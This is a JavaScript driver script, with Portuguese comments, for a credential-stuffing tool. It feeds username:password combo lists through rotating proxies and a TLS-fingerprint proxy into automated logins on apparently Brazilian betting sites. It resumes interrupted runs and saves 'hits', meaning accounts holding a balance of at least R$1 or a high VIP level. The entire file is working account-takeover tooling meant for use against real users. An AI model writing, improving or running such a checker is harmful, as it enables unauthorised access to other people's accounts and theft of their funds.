// rodar.js — serial em processo único: 1 TLSProxy, 1 browser, retomada
import fs from "fs";
import path from "path";
import { ROOT } from "./src/paths.js";
import { loadCasas } from "./src/storage.js";
import { loadProxies } from "./src/proxy.js";
import { startTlsProxy } from "./src/tls.js";
import { setRateLimit } from "./src/trpc.js";
import { fullCheck } from "./src/login.js";
import { fecharBrowser } from "./src/browser.js";
import { obterPar } from "./src/browser.js";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const casaNome = process.argv[2] || "79";
const arquivo = process.argv[3] || "contas.txt";
const LIMITE = Number(process.env.LIMITE) || 120000;
const PAUSA = Number(process.env.PAUSA) || 700;
const MIN_SALDO = Number(process.env.MIN_SALDO) || 1;
const MIN_VIP = Number(process.env.MIN_VIP) || 3;

const casa = loadCasas()[casaNome];
if (!casa) {
  console.log("casa nao encontrada");
  process.exit(1);
}

const dirHits = path.join(ROOT, "hits");
fs.mkdirSync(dirHits, { recursive: true });
const saida = path.join(dirHits, `lote_${casaNome}.txt`);
const hitsFile = path.join(dirHits, `hits_${casaNome}.txt`);
if (!fs.existsSync(saida)) fs.writeFileSync(saida, "");
if (!fs.existsSync(hitsFile)) fs.writeFileSync(hitsFile, "");

// só pula quem já tem veredito
const feitas = new Set();
for (const l of fs.readFileSync(saida, "utf-8").split(/\r?\n/)) {
  const p = l.split(" | ");
  if (!p[0]) continue;
  const st = (p[3] || "").trim();
  if (st === "INCONCLUSIVO" || st === "TIMEOUT" || st === "INCONCL") continue;
  feitas.add(p[0].trim());
}

const vistos = new Set();
const contas = [];
for (const bruta of fs.readFileSync(path.join(ROOT, arquivo), "utf-8").split(/\r?\n/)) {
  const l = bruta.replace(/\ufeff/g, "").replace(/\s*:\s*/g, ":").trim();
  if (!l.includes(":")) continue;
  const u = l.slice(0, l.indexOf(":")).trim();
  if (!u) continue;
  if (/^\d{11}$/.test(u) && u[2] !== "9") continue;
  if (feitas.has(l) || vistos.has(l)) continue;
  vistos.add(l);
  contas.push(l);
}

if (!contas.length) {
  console.log(`  nada a fazer — ${feitas.size} já com veredito`);
  process.exit(0);
}

loadProxies(path.join(ROOT, "proxy.txt"));
console.log(`  casa ${casaNome} (${casa.domain}) | ${contas.length} a fazer | limite ${LIMITE / 1000}s`);
console.log(`  hit = saldo >= R$${MIN_SALDO} ou vip >= ${MIN_VIP}\n`);

setRateLimit(600);
await Promise.all([startTlsProxy(), obterPar(casa).catch(() => null)]);

let ativo = true;
process.on("SIGINT", async () => {
  ativo = false;
  await fecharBrowser();
  console.log("\n  parando...");
  process.exit(0);
});

const comPrazo = (p, ms) =>
  Promise.race([p, sleep(ms).then(() => { throw new Error("__timeout"); })]);

let n = 0;
let hits = 0;
const placar = {};

for (const conta of contas) {
  if (!ativo) break;
  n++;

  const i = conta.indexOf(":");
  const usuario = conta.slice(0, i);
  const senha = conta.slice(i + 1);

  let report = null;
  let status = "INCONCLUSIVO";

  try {
    report = await comPrazo(fullCheck(casa, casaNome, usuario, senha), LIMITE);
    status = report?.status || "INCONCLUSIVO";
  } catch (e) {
    status = e.message === "__timeout" ? "TIMEOUT" : "ERRO";
  }

  const saldo = report?.saldo ?? null;
  const vip = report?.vip ?? null;
  placar[status] = (placar[status] || 0) + 1;

  const linha = `${conta} | vip=${vip ?? "?"} | saldo=${saldo ?? "?"} | ${status}`;
  fs.appendFileSync(saida, linha + "\n", "utf-8");

  const bom = status === "LOGIN_OK" || status === "PROIBIDA";
  const ehHit = bom && ((saldo !== null && saldo >= MIN_SALDO) || (vip !== null && vip >= MIN_VIP));

  if (ehHit) {
    hits++;
    fs.appendFileSync(hitsFile, `${conta} | vip=${vip ?? "?"} | saldo=${saldo ?? "?"} | ${status}\n`, "utf-8");
    console.log(`  HIT   ${conta} | vip=${vip ?? "?"} | saldo=${saldo ?? "?"}${report?.nome ? ` | ${report.nome}` : ""}  [${hits}]`);
  } else if (status === "LOGIN_OK") {
    console.log(`  sem saldo  ${conta} | vip=${vip ?? "?"} | saldo=${saldo ?? "?"}`);
  } else if (status === "TIMEOUT" || status === "INCONCLUSIVO" || status === "ERRO") {
    console.log(`  ${status.padEnd(13)} ${conta} | ${(report?.detalhe || "").slice(0, 90)}`);
  } else {
    console.log(`  ${status.padEnd(13)} ${conta}`);
  }

  if (n % 10 === 0) {
    const top = Object.entries(placar).sort((a, b) => b[1] - a[1]).slice(0, 4).map(([k, v]) => `${k}:${v}`).join(" ");
    console.log(`  -- ${n}/${contas.length} | hits ${hits} | ${top}`);
  }

  if (PAUSA) await sleep(PAUSA);
}

console.log(`\n  fim: ${n} percorridas | ${hits} hits`);
console.log(`  placar: ${JSON.stringify(placar)}`);
console.log(`  ${hitsFile}`);
await fecharBrowser();
process.exit(0);